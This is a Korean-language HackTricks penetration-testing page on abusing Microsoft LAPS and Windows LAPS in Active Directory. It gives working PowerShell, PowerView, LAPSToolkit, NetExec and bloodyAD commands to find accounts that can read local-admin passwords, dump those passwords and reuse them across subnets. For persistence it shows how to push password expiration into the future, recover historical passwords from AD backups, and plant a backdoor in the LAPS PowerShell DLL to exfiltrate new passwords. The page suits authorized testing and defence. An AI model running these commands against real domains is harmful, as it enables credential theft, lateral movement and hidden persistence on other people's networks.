# LAPS

{{#include ../../banners/hacktricks-training.md}}


## 기본 정보

현재 assessment 중에 접할 수 있는 **LAPS flavour**는 **2가지**입니다:

- **Legacy Microsoft LAPS**: 로컬 administrator password를 **`ms-Mcs-AdmPwd`**에 저장하고, expiration time을 **`ms-Mcs-AdmPwdExpirationTime`**에 저장합니다.
- **Windows LAPS** (2023년 4월 업데이트 이후 Windows에 기본 제공): 여전히 legacy mode를 emulate할 수 있지만, native mode에서는 **`msLAPS-*`** attributes를 사용하고 **password encryption**, **password history**, domain controller용 **DSRM password backup**을 지원합니다.

LAPS는 **local administrator passwords**를 관리하도록 설계되었으며, domain-joined computers에서 이를 **고유하고, randomize되며, 자주 변경**되도록 만듭니다. 해당 attributes를 읽을 수 있다면 일반적으로 영향을 받는 host에 **local admin으로 pivot**할 수 있습니다. 많은 환경에서 중요한 부분은 password 자체를 읽는 것뿐만 아니라, password attributes에 대한 access가 **누구에게 delegated되었는지** 찾는 것입니다.

### Legacy Microsoft LAPS attributes

domain의 computer objects에서 Legacy Microsoft LAPS를 구현하면 두 개의 attributes가 추가됩니다:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS는 computer objects에 여러 새로운 attributes를 추가합니다:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: encryption이 활성화되지 않은 경우 JSON으로 저장되는 clear-text password blob
- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: domain controllers용 encrypted DSRM password data
- **`msLAPS-CurrentPasswordVersion`**: 최신 rollback-detection logic에서 사용하는 GUID-based version tracking (Windows Server 2025 forest schema)

**`msLAPS-Password`**를 읽을 수 있는 경우, 해당 value는 account name, update time, clear-text password를 포함하는 JSON object이며, 예시는 다음과 같습니다:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### 활성화 여부 확인
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`에서 **raw LAPS policy**를 **download**한 다음, [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package의 **`Parse-PolFile`**을 사용하여 이 파일을 사람이 읽을 수 있는 형식으로 변환할 수 있습니다.

### Legacy Microsoft LAPS PowerShell cmdlets

Legacy LAPS module이 설치되어 있다면 다음 cmdlet을 일반적으로 사용할 수 있습니다:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS에는 새로운 PowerShell module과 새로운 cmdlets가 포함되어 있습니다:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
여기서 몇 가지 운영 세부 사항이 중요합니다:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`**는 **legacy LAPS**, **clear-text Windows LAPS**, **encrypted Windows LAPS**를 자동으로 처리합니다.
- 비밀번호가 암호화되어 있고 이를 **read**할 수 있지만 **decrypt**할 수 없는 경우, cmdlet은 clear-text 비밀번호를 반환할 수 없더라도 **`Source`**, **`DecryptionStatus`**, **`AuthorizedDecryptor`**와 같은 metadata를 반환합니다.
- **encrypted Windows LAPS**에서는 **read permission**과 **decrypt permission**이 **서로 다른 control**입니다. OU / object에 대한 read access가 있다고 해서 **`msLAPS-EncryptedPassword`**를 자동으로 decrypt할 수 있는 것은 아닙니다.
- **Password history**는 **Windows LAPS encryption**이 활성화된 경우에만 사용할 수 있습니다.
- domain controller에서는 반환되는 source가 **`EncryptedDSRMPassword`**일 수 있습니다.

이는 assessment 중에 유용합니다. **`AuthorizedDecryptor`** field를 통해 blob이 **어떤 user 또는 group을 대상으로 암호화되었는지** 알 수 있기 때문이며, 이를 통해 실패한 password read가 새로운 privilege-escalation target으로 이어지는 경우가 많습니다.

### PowerView / LDAP

**PowerView**를 사용하면 password를 read할 수 있는 사람이 누구인지 확인하고 실제로 password를 read할 수도 있습니다:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
**`msLAPS-Password`**가 읽기 가능한 경우, 반환된 JSON을 파싱하고 비밀번호에는 **`p`**를, 관리되는 로컬 관리자 계정 이름에는 **`n`**을 추출합니다.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
새로운 **deployments**에서는 **`n`** 필드가 중요합니다. **Windows LAPS automatic account management**가 기본 제공되는 **`Administrator`** 대신 **custom account**를 대상으로 지정할 수 있으며, 최신 **Windows 11 24H2 / Windows Server 2025** 시스템에서는 해당 account 이름을 **randomize**할 수도 있기 때문입니다.<sup>[[4]](#references)</sup>

### Linux / 원격 도구

최신 도구는 legacy Microsoft LAPS와 Windows LAPS를 모두 지원합니다.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notes:

- 최근 **NetExec** 빌드는 **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, **`msLAPS-EncryptedPassword`**를 지원합니다.
- **`pyLAPS`**는 Linux에서 **legacy Microsoft LAPS**를 사용할 때 여전히 유용하지만, **`ms-Mcs-AdmPwd`**만 대상으로 합니다.
- **`LAPS4LINUX`**, **`dpapi-ng`** 기반 tooling, 최신 **NetExec** workflow와 같은 새로운 cross-platform tooling은 non-Windows host에서도 **native Windows LAPS**를 처리할 수 있습니다.
- 환경에서 **encrypted Windows LAPS**를 사용하는 경우 단순한 LDAP read만으로는 충분하지 않습니다. **authorized decryptor**이거나, offline domain DPAPI-NG root key material과 같은 동등한 decryption material도 필요합니다.<sup>[[5]](#references)</sup>
- **Windows 11 24H2 / Windows Server 2025**에서는 managed local admin이 항상 **`Administrator`**라고 가정하지 마세요. Automatic account management는 custom account를 생성하고 선택적으로 이름을 randomize할 수 있으므로, 대규모로 **`--laps`**를 사용하기 전에 **`n`** / **`Account`**를 통해 account name을 먼저 확인해야 합니다.<sup>[[4]](#references)</sup>

### Directory synchronization abuse

각 computer object에 대한 직접적인 read access 대신 domain-level **directory synchronization** rights를 보유하고 있다면 LAPS가 여전히 중요할 수 있습니다.

**`DS-Replication-Get-Changes`**와 **`DS-Replication-Get-Changes-In-Filtered-Set`** 또는 **`DS-Replication-Get-Changes-All`**을 함께 사용하면 legacy **`ms-Mcs-AdmPwd`**와 같은 **confidential / RODC-filtered** attributes를 synchronize할 수 있습니다. BloodHound는 이를 **`SyncLAPSPassword`**로 모델링합니다. replication-rights background는 [DCSync](dcsync.md)를 확인하세요.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)은 여러 functions를 통해 LAPS enumeration을 지원합니다.<sup>[[6]](#references)</sup>\
그중 하나는 **LAPS가 enabled된 모든 computer**에 대한 **`ExtendedRights`**를 parsing하는 것입니다. 이를 통해 **LAPS passwords를 read하도록 명시적으로 delegated된 groups**를 확인할 수 있으며, 이러한 groups에는 protected groups의 users가 포함되는 경우가 많습니다.\
**computer를 domain에 join한** **account**는 해당 host에 대해 `All Extended Rights`를 받으며, 이 right를 통해 해당 **account**는 **passwords를 read**할 수 있습니다. Enumeration 결과, host에서 LAPS password를 read할 수 있는 user account가 표시될 수 있습니다. 이는 LAPS passwords를 read할 수 있는 **특정 AD users를 target**하는 데 도움이 됩니다.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## NetExec / CrackMapExec을 사용한 LAPS Password Dumping

interactive PowerShell이 없는 경우 LDAP를 통해 이 권한을 원격으로 악용할 수 있습니다:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
사용자가 읽을 수 있는 모든 LAPS secret을 dump하여, 다른 local administrator password를 사용해 lateral movement를 수행할 수 있습니다.

## LAPS Password 사용
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS 지속성

### 만료 날짜

관리자 권한을 획득하면 **암호를 획득**하고 **만료 날짜를 미래로 설정**하여 시스템이 **암호를 업데이트하지 못하도록** 할 수 있습니다.

레거시 Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS는 대신 **`msLAPS-PasswordExpirationTime`**을 사용합니다:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> **admin**이 **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**를 사용하거나 **Do not allow password expiration time longer than required by policy**가 활성화되어 있으면 password는 계속 rotate됩니다.

### 최신 Windows LAPS에서의 Snapshot rollback 주의사항

이전의 snapshot / image rollback trick은 최신 **Windows LAPS** deployment에 대해 **신뢰성이 낮습니다**. **Windows 11 24H2 / Windows Server 2025**에서 forest schema에 **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**)이 포함된 경우, client는 로컬에 cache된 GUID와 AD에 저장된 값을 비교하며, rollback으로 인해 **torn state**가 생성되면 **즉시 password를 rotate**합니다.

실제로 이는 snapshot 기반 persistence 또는 이전에 알고 있던 local admin password를 되살리려는 시도가 다음 정상 expiration까지 유지되지 못하고 빠르게 무효화될 수 있음을 의미합니다.<sup>[[2]](#references)</sup>

이 보호 기능은 **AD-backed Windows LAPS**에만 적용되며, 되돌린 machine이 **AD에 다시 authenticate**할 수 있어야 한다는 전제도 여전히 필요합니다. machine이 더 이상 AD와 통신할 수 없다면 **password history** 또는 **AD backup access**가 여전히 문제를 해결해 줄 수 있습니다.

### Automatic account management tamper 주의사항

**automatic account management**가 활성화되면 Windows LAPS가 관리되는 local admin account의 lifecycle을 소유합니다. 해당 account의 이름을 바꾸거나, reconfigure하거나, 그 밖의 방식으로 tamper하려는 예기치 않은 시도는 **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**와 함께 거부될 수 있으므로, 관리되는 LAPS account를 조용히 수정하는 데 의존하는 persistence는 최신 endpoint에서 신뢰성이 낮습니다.<sup>[[4]](#references)</sup>

### AD backup에서 historical password 복구

**Windows LAPS encryption + password history**가 활성화되어 있으면, mount된 AD backup이 추가적인 secret source가 될 수 있습니다. mount된 AD snapshot에 access할 수 있고 **recovery mode**를 사용하면 live DC와 통신하지 않고도 이전에 저장된 password를 query할 수 있습니다.<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
이는 주로 **AD backup theft**, **offline forensics abuse** 또는 **disaster-recovery media access** 중에 관련됩니다.

### Backdoor

legacy Microsoft LAPS의 원본 소스 코드는 [here](https://github.com/GreyCorbel/admpwd)에서 확인할 수 있으므로, 코드에 backdoor를 삽입할 수 있습니다(예를 들어 `Main/AdmPwd.PS/Main.cs`의 `Get-AdmPwdPassword` 메서드 내부에 삽입). 이를 통해 **새 비밀번호를 exfiltrate하거나 어딘가에 저장**할 수 있습니다.

그런 다음 새 `AdmPwd.PS.dll`을 compile하고, `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` 경로의 machine에 upload합니다(그리고 modification time을 변경합니다).

## 참고 자료

- [1] [Introduction to Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Windows LAPS schema and rights extensions for Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Get started with Windows LAPS and Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Windows LAPS account management modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
